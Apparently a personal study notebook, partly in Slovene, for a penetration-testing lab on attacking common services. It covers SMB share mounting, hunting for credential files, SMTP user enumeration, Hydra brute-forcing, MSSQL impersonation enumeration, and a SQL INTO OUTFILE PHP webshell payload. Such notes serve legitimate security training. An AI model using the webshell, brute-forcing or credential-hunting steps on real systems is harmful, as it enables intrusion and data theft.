
## Server Message Block (SMB)

```cmd
net use n: \\192.168.220.129\Finance /user:plaintext Password123
```

  
Interacting with Common Services

```shell-session
dir n: /a-d /s /b | find /c ":\"
```

| **Syntax** | **Description**                                                |
| ---------- | -------------------------------------------------------------- |
| `dir`      | Application                                                    |
| `n:`       | Directory or drive to search                                   |
| `/a-d`     | `/a` is the attribute and `-d` means not directories           |
| `/s`       | Displays files in a specified directory and all subdirectories |
| `/b`       | Uses bare format (no heading information or summary)           |

If we want to search for a specific word within a text file, we can use [findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr).

  
Interacting with Common Services

```cmd
c:\htb>findstr /s /i cred n:\*.*

n:\Contracts\private\secret.txt:file with all credentials
n:\Contracts\private\credentials.txt:admin:SecureCredentials!
```

https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr#examples

#### Windows PowerShell

```powershell
Get-ChildItem \\192.168.220.129\Finance\
```

mount the drive
```powershell
 New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"
```

opening with credentials

```powershell
 $username = 'plaintext'
 $password = 'Password123'
 $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
 New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
```




#### attackign common services easy (bs)

smtp enum userjev

-> dobim fiona@inlanefreight.htb

hydra smpt za geslo od fiona
-> rockyou wordlist

ftp -> commande
```
oreFTP:
Directory C:\CoreFTP
Ports: 21 & 443
Test Command: curl -k -H "Host: localhost" --basic -u <username>:<password> https://localhost/docs.txt

Apache
Directory "C:\xampp\htdocs\"
Ports: 80 & 4443
Test Command: curl http://localhost/test.php

```
webshellupload preko sql

```
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'
```

v browser potem 

```
basuerl/weshell.php?c= <komande>

```

## MSSQL IMPERSONAITE

```cmd-session
SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```

https://github.com/missteek/cpts-quick-references/blob/main/assessments/Attacking%20Common%20Services%20-%20Hard.md

